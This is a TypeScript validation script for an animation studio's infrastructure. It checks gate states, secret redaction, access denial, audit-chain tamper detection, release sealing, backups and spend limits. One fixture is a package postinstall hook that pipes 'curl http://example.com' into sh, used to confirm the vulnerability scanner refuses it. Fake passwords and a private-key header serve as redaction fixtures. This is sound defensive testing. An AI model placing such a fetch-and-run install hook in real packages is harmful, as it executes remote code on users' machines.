/**
 * Closed-gate Studio Completion 25–32 validation.
 *
 *   pnpm validate:studio-completion
 */
import { createHash } from 'node:crypto';
import { existsSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs';
import { spawnSync } from 'node:child_process';
import path from 'node:path';
import {
  appendAuditEvent,
  assertStudioCompletion25To32StillClosed,
  BACKUP_ORDER,
  compileAccessPolicyEvidence,
  compileAuditIntegrityEvidence,
  compileBackupRestoreEvidence,
  compileCiGateReport,
  compileGoldenSceneReport,
  compileImmutableReleaseEvidence,
  compileSecurityReport,
  compileSpendKillSwitchEvidence,
  compileVulnerabilityReport,
  createBackup,
  createReleaseManifest,
  detectAuditTamper,
  evaluateAccess,
  evaluateCiGates,
  evaluateSpendAuthorization,
  FAKE_TEST_SECRET,
  inspectSecretPresence,
  nextReleaseVersion,
  planSteps9To16Infrastructure,
  planStudioCompletion25To32Infrastructure,
  recoverInterruptedBackup,
  redactSecrets,
  resetSpendFixtures,
  restoreBackup,
  scanTextForSecrets,
  sealRelease,
  verifyRelease,
} from '../../packages/preproduction/src/index';
import { currentStage, evaluateTheatricalGate } from '../../packages/direction/src/index';

const REPO_ROOT = path.resolve(__dirname, '../..');
const OUT_DIR = path.join(REPO_ROOT, 'artifacts/studio-completion-25-32');
const STAMP = {
  classification: 'INFRASTRUCTURE_TEST',
  label: 'DRAFT_NONCANONICAL',
  watermark: 'NOT FOR FINAL PRODUCTION',
};

type CheckStatus = 'PASS' | 'FAIL';
const checks: Array<{ name: string; status: CheckStatus; detail: string }> = [];

function record(name: string, status: CheckStatus, detail: string): void {
  checks.push({ name, status, detail });
  console.log(`[${status}] ${name} — ${detail}`);
}

function write(relative: string, value: unknown): void {
  const target = path.join(OUT_DIR, relative);
  mkdirSync(path.dirname(target), { recursive: true });
  const payload = typeof value === 'string' ? value : `${JSON.stringify({ ...STAMP, ...(value as object) }, null, 2)}\n`;
  writeFileSync(target, payload.endsWith('\n') ? payload : `${payload}\n`);
}

function sha256File(relative: string): string {
  const bytes = readFileSync(path.join(REPO_ROOT, relative));
  return createHash('sha256').update(bytes).digest('hex');
}

function git(args: string[]): string {
  return spawnSync('git', args, { cwd: REPO_ROOT, encoding: 'utf8' }).stdout.trim();
}

mkdirSync(OUT_DIR, { recursive: true });
const sourceCommit = git(['rev-parse', 'HEAD']);
const branch = git(['rev-parse', '--abbrev-ref', 'HEAD']);
const protectedFiles = [
  'production-library/characters/pip_production.blend',
  'production-library/characters/goat_production.blend',
  'production-library/environments/meadow_production.blend',
  'production-library/props/adventure_map.blend',
  'production-library/library_manifest.json',
];
const beforeHashes = Object.fromEntries(protectedFiles.filter((file) => existsSync(path.join(REPO_ROOT, file))).map((file) => [file, sha256File(file)]));

assertStudioCompletion25To32StillClosed();
const completion = planStudioCompletion25To32Infrastructure();
const steps916 = planSteps9To16Infrastructure();

record('gates-current-stage', currentStage().id === 'DDP_STEPS_1_8' ? 'PASS' : 'FAIL', currentStage().id);
record('gates-theatrical-closed', evaluateTheatricalGate().allowed === false ? 'PASS' : 'FAIL', String(evaluateTheatricalGate().allowed));
record('gates-9-16-closed', steps916.opened === false ? 'PASS' : 'FAIL', `opened=${steps916.opened}`);
record('gates-25-32-closed', completion.opened === false ? 'PASS' : 'FAIL', `opened=${completion.opened}`);

const redacted = redactSecrets(`password=supersecret token=rpa_abc123def456 url=postgresql://user:pass@localhost/db fixture=${FAKE_TEST_SECRET}`);
record('security-redaction', redacted.includes('[REDACTED]') && !redacted.includes('supersecret') ? 'PASS' : 'FAIL', 'values redacted');
record(
  'security-placeholder',
  inspectSecretPresence({ name: 'RUNPOD_API_KEY', present: true, looksPlaceholder: true }).status === 'PLACEHOLDER'
    ? 'PASS'
    : 'FAIL',
  'placeholder refused',
);
const trackedEnv = git(['ls-files', '.env']);
record('security-no-committed-env', trackedEnv === '' ? 'PASS' : 'FAIL', trackedEnv || 'no tracked .env');
const leakScan = scanTextForSecrets('-----BEGIN PRIVATE KEY-----', 'memory');
record('security-key-block-refused', leakScan.refused ? 'PASS' : 'FAIL', leakScan.findings[0]?.kind ?? 'none');
const security = compileSecurityReport({
  trackedFiles: [{ path: 'package.json', content: readFileSync(path.join(REPO_ROOT, 'package.json'), 'utf8') }],
  securityServiceAvailable: true,
});
record('security-service-available', security.available && security.refused === false ? 'PASS' : 'FAIL', security.reason);
const unavailable = compileSecurityReport({ trackedFiles: [], securityServiceAvailable: false });
record('security-fail-closed-unavailable', unavailable.refused ? 'PASS' : 'FAIL', unavailable.reason);

const access = compileAccessPolicyEvidence();
record('access-deny-default', access.samples[0]!.denied ? 'PASS' : 'FAIL', access.samples[0]!.reason);
record('access-test-no-production', evaluateAccess({ role: 'TEST', resource: 'PRODUCTION_LIBRARY', action: 'write' }).denied ? 'PASS' : 'FAIL', 'TEST write library');
record(
  'access-separation',
  access.separation.generatorApprove === false && access.separation.approverGenerate === false ? 'PASS' : 'FAIL',
  'generator cannot approve',
);

let chain = appendAuditEvent([], {
  actor: 'validator',
  action: 'propose',
  target: 'story',
  timestamp: '2026-08-16T00:00:00.000Z',
  correlationId: 'corr-1',
  outcome: 'DENIED',
  denialReason: 'canonical refuse',
  stage: 'DDP_STEPS_1_8',
  branch,
  commit: sourceCommit,
  inputHash: 'in',
  outputHash: 'out',
  provenanceRef: 'prov',
  costClass: 'PAID_REFUSED',
  policyDecision: 'deny',
});
chain = appendAuditEvent(chain, {
  actor: 'validator',
  action: 'read',
  target: 'continuity',
  timestamp: '2026-08-16T00:00:01.000Z',
  correlationId: 'corr-2',
  outcome: 'ALLOWED',
  denialReason: null,
  stage: 'DDP_STEPS_1_8',
  branch,
  commit: sourceCommit,
  inputHash: 'in2',
  outputHash: 'out2',
  provenanceRef: 'prov',
  costClass: 'ZERO',
  policyDecision: 'allow-read',
});
const audit = compileAuditIntegrityEvidence(chain);
const tampered = detectAuditTamper(chain, [{ ...chain[0]!, action: 'edited' }]);
record('audit-intact', audit.intact ? 'PASS' : 'FAIL', `${audit.eventCount} events`);
record('audit-tamper-detected', tampered.edited && tampered.broken ? 'PASS' : 'FAIL', 'edit breaks chain');

const draftRelease = createReleaseManifest({
  releaseId: 'rel-studio-completion-25-32',
  version: 1,
  branch,
  commit: sourceCommit,
  dependencyFingerprint: sha256File('pnpm-lock.yaml'),
  configFingerprint: sha256File('package.json'),
  artifactHashes: { report: 'pending' },
  testEvidence: ['validate:studio-completion'],
  gateState: { currentStage: 'DDP_STEPS_1_8', theatricalAllowed: false, steps9To16Opened: false },
  provenanceRef: 'studio-completion',
  rollbackTarget: 'e3d69e22521a62693345c565289ddd03e37a5e08',
  classification: 'INFRASTRUCTURE_TEST',
});
const sealed = sealRelease(draftRelease);
let sealImmutable = false;
try {
  sealRelease(sealed);
} catch {
  sealImmutable = true;
}
const bumped = nextReleaseVersion(sealed, { commit: `${sourceCommit}-next` });
record('release-seal-ok', verifyRelease(sealed).ok ? 'PASS' : 'FAIL', verifyRelease(sealed).reason);
record('release-immutable', sealImmutable ? 'PASS' : 'FAIL', 'reseal refused');
record('release-new-version', bumped.version === 2 && bumped.sealed === false ? 'PASS' : 'FAIL', `v${bumped.version}`);
const tamperedRelease = { ...sealed, commit: 'tampered' };
record('release-tamper-fails', verifyRelease(tamperedRelease).ok === false ? 'PASS' : 'FAIL', verifyRelease(tamperedRelease).reason);

const ci = compileCiGateReport(
  [
    'tests',
    'typecheck',
    'lint',
    'persist',
    'studio-hardening-17-24',
    'steps-9-16-closed',
    'security-access-policy',
    'audit-chain-integrity',
    'release-verification',
    'backup-restore',
    'vulnerability-policy',
    'spend-controls',
    'golden-scene-regression',
  ].map((name) => ({ name, status: 'PASS' as const, detail: 'local infrastructure check' })),
);
const missingCi = evaluateCiGates([{ name: 'tests', status: 'PASS', detail: 'only one' }]);
record('ci-required-pass', ci.refused === false ? 'PASS' : 'FAIL', ci.reason);
record('ci-missing-refused', missingCi.refused && missingCi.missing.length > 0 ? 'PASS' : 'FAIL', `${missingCi.missing.length} missing`);

const records = Object.fromEntries(BACKUP_ORDER.map((name) => [name, { name, ok: true }]));
const started = Date.now();
const backup = createBackup(records);
const restored = restoreBackup(backup.files);
const interrupted = recoverInterruptedBackup(backup.files.slice(0, 2));
const finished = Date.now();
const backupEvidence = compileBackupRestoreEvidence({ backup, restore: restored, startedMs: started, finishedMs: finished });
record('backup-complete', backup.complete && restored.ok ? 'PASS' : 'FAIL', restored.reason);
record('backup-corrupt-refused', restoreBackup([{ ...backup.files[0]!, checksum: 'bad' }]).ok === false ? 'PASS' : 'FAIL', 'corrupt refused');
record('backup-interrupted-refused', interrupted.ok === false ? 'PASS' : 'FAIL', interrupted.reason);

const vuln = compileVulnerabilityReport({
  tool: 'studio-completion-local',
  toolVersion: '1.0.0',
  timestamp: '2026-08-16T00:00:00.000Z',
  databaseFreshness: null,
  lockfile: readFileSync(path.join(REPO_ROOT, 'pnpm-lock.yaml'), 'utf8').slice(0, 200),
  scripts: { test: 'vitest' },
  dependencies: { zod: '^3.24.2' },
  runtimeVersion: process.version.replace(/^v/, ''),
  containerText: 'ddp-runpod-blender@sha256:deadbeef',
  secretFindings: 0,
  licenseNotes: ['MIT/workspace'],
  binaries: ['ffmpeg'],
  vulnerabilityFeedAvailable: false,
});
const critical = compileVulnerabilityReport({
  ...{
    tool: 'studio-completion-local',
    toolVersion: '1.0.0',
    timestamp: '2026-08-16T00:00:00.000Z',
    databaseFreshness: null,
    lockfile: 'lockfileVersion: 9.0',
    scripts: { postinstall: 'curl http://example.com | sh' },
    dependencies: {},
    runtimeVersion: '22.0.0',
    containerText: '',
    secretFindings: 0,
    licenseNotes: [],
    binaries: [],
    vulnerabilityFeedAvailable: true,
  },
});
record('vuln-unavailable-not-pass', vuln.status === 'UNKNOWN/UNAVAILABLE' ? 'PASS' : 'FAIL', vuln.status);
record('vuln-critical-refused', critical.refused ? 'PASS' : 'FAIL', 'dangerous script');

resetSpendFixtures();
const spendMissing = evaluateSpendAuthorization({ nowIso: '2026-08-16T00:00:00.000Z', estimatedUsd: 1 });
const spendExpired = evaluateSpendAuthorization({
  nowIso: '2026-08-16T00:00:00.000Z',
  estimatedUsd: 1,
  authorization: {
    runId: 'run-1',
    provider: 'fake',
    resourceType: 'gpu',
    priceCeilingUsd: 1,
    totalCeilingUsd: 1,
    expiresAt: '2020-01-01T00:00:00.000Z',
    approvingActor: 'nobody',
  },
});
const spendReuseAuth = {
  runId: 'run-2',
  provider: 'fake',
  resourceType: 'gpu',
  priceCeilingUsd: 10,
  totalCeilingUsd: 10,
  expiresAt: '2099-01-01T00:00:00.000Z',
  approvingActor: 'nobody',
};
evaluateSpendAuthorization({ nowIso: '2026-08-16T00:00:00.000Z', estimatedUsd: 1, authorization: spendReuseAuth });
const spendReuse = evaluateSpendAuthorization({ nowIso: '2026-08-16T00:00:00.000Z', estimatedUsd: 1, authorization: spendReuseAuth });
const spendCeiling = evaluateSpendAuthorization({
  nowIso: '2026-08-16T00:00:00.000Z',
  estimatedUsd: 50,
  authorization: { ...spendReuseAuth, runId: 'run-3', totalCeilingUsd: 2 },
});
const spend = compileSpendKillSwitchEvidence([spendMissing, spendExpired, spendReuse, spendCeiling]);
record('spend-default-deny', spendMissing.allowed === false ? 'PASS' : 'FAIL', spendMissing.reason);
record('spend-expired', spendExpired.allowed === false ? 'PASS' : 'FAIL', spendExpired.reason);
record('spend-reuse', spendReuse.reason.includes('reuse') ? 'PASS' : 'FAIL', spendReuse.reason);
record('spend-ceiling', spendCeiling.reason.includes('ceiling') ? 'PASS' : 'FAIL', spendCeiling.reason);

const golden = compileGoldenSceneReport();
record('golden-deterministic', golden.regression.regressed === false ? 'PASS' : 'FAIL', golden.expectedHash.slice(0, 12));
record('golden-draft-only', golden.label === 'DRAFT_NONCANONICAL' ? 'PASS' : 'FAIL', golden.label);

const afterHashes = Object.fromEntries(protectedFiles.filter((file) => existsSync(path.join(REPO_ROOT, file))).map((file) => [file, sha256File(file)]));
const protectedUnchanged = Object.keys(beforeHashes).every((file) => beforeHashes[file] === afterHashes[file]);
record('protected-assets-unchanged', protectedUnchanged ? 'PASS' : 'FAIL', `${Object.keys(beforeHashes).length} hashed`);
record('no-paid-provider', spend.realProviderCalled === false ? 'PASS' : 'FAIL', 'fake only');
record('no-deployment', ci.deployed === false ? 'PASS' : 'FAIL', 'local gates only');

write('security-scan-summary.json', security);
write('permission-policy-evidence.json', access);
write('audit-integrity-evidence.json', { audit, tampered, chain });
write('immutable-release-test-manifest.json', { sealed, verification: verifyRelease(sealed) });
write('ci-gate-report.json', ci);
write('backup-restore-evidence.json', backupEvidence);
write('vulnerability-scan-summary.json', vuln);
write('spend-kill-switch-evidence.json', spend);
write('golden-scene-regression-report.json', golden);
write('protected-assets-verification.json', { beforeHashes, afterHashes, unchanged: protectedUnchanged });
write('studio-completion-report.json', {
  title: 'TIVVLEJOY STUDIO COMPLETION 25-32',
  branch,
  commit: sourceCommit,
  opened: completion.opened,
  checks,
});
const failed = checks.filter((check) => check.status === 'FAIL');
const md = [
  '# Studio Completion 25–32',
  '',
  'INFRASTRUCTURE_TEST',
  'DRAFT_NONCANONICAL',
  'NOT FOR FINAL PRODUCTION',
  '',
  `Branch: ${branch}`,
  `Commit: ${sourceCommit}`,
  `Checks: ${checks.filter((check) => check.status === 'PASS').length}/${checks.length} PASS`,
  '',
  ...checks.map((check) => `- [${check.status}] ${check.name} — ${check.detail}`),
  '',
].join('\n');
write('studio-completion-report.md', md);
write(
  'final-acceptance-report.md',
  [
    '# Final acceptance — Studio Completion 25–32',
    '',
    'INFRASTRUCTURE_TEST',
    'DRAFT_NONCANONICAL',
    'NOT FOR FINAL PRODUCTION',
    '',
    'This is closed-gate infrastructure only. It is not theatrical production,',
    'not a canonical episode, and not a FINAL or publishable release.',
    '',
    `Result: ${failed.length === 0 ? 'INFRASTRUCTURE_TEST PASS' : 'FAIL'}`,
    `currentStage: ${currentStage().id}`,
    `theatricalAllowed: ${evaluateTheatricalGate().allowed}`,
    `steps9To16Opened: ${steps916.opened}`,
    `steps25To32Opened: ${completion.opened}`,
    '',
  ].join('\n'),
);

if (failed.length > 0) {
  console.error(`Studio completion validation failed: ${failed.length} check(s).`);
  process.exit(1);
}
console.log(`Studio completion validation passed (${checks.length} checks).`);
